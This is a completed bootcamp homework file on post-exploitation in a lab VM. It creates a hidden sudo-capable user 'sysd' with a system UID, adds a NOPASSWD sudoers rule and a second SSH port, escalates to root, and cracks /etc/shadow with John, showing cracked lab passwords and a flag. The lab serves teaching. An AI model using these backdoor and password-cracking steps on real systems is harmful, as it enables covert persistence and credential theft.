## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - adduser --no-create-home sysd

2. Give your secret user a password: 
    - passwd sysd
      Enter new UNIX password: 
      Retype new UNIX password: 
      passwd: password updated successfully

3. Give your secret user a system UID < 1000:
    - usermod -u 182 sysd

4. Give your secret user the same GID:
   - groupmod -g 182 sysd

5. Give your secret user full `sudo` access without the need for a password:
   -  usermod -aG sudo sysd
visudo
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
sysd ALL=(ALL) NOPASSWD:ALL

# Vagrant Privs for config
vagrant ALL=(ALL) NOPASSWD:ALL
sysadmin  ALL=(ALL:ALL) /usr/bin/less



6. Test that `sudo` access works without your password:

    sudo -l
Matching Defaults entries for sysd on scavenger-hunt:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysd may run the following commands on scavenger-hunt:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL

  

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

cd /etc/ssh
nano sshd_config

#       $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Port 22
Port 2222
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10



**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    - sudo systemctl restart ssh

2. Exit the `root` account:
    - root:~\ $ exit
      exit
      sysadmin:~\ $ exit
      logout
      Connection to 192.168.6.105 closed.


3. SSH to the target machine using your `sysd` account and port `2222`:
    - ssh sysd@192.168.6.105 -p 2222
      sysd@192.168.6.105's password: 
      Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-132-generic x86_64)


4. Use `sudo` to switch to the root user:
    - sysd@scavenger-hunt:/$ sudo su

      You found flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0

      root@scavenger-hunt:/# whoami
      root
      root@scavenger-hunt:/#


**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - ssh sysd@192.168.6.105 -p 2222


2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    - sysd@scavenger-hunt:/$ sudo su

      You found flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0

      root@scavenger-hunt:/# cd /etc
      root@scavenger-hunt:/etc# john shadow
      Loaded 8 password hashes with 8 different salts (crypt, generic crypt(3) [?/64])
      root@scavenger-hunt:/etc# john --show shadow
      sysadmin:passw0rd:18387:0:99999:7:::
      student:Goodluck!:18387:0:99999:7:::
      mitnik:trustno1:18387:0:99999:7:::
      babbage:freedom:18387:0:99999:7:::
      lovelace:dragon:18387:0:99999:7:::
      stallman:computer:18387:0:99999:7:::
      turing:lakers:18387:0:99999:7:::
      sysd:hello:18654:0:99999:7:::

      8 password hashes cracked, 0 left


---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

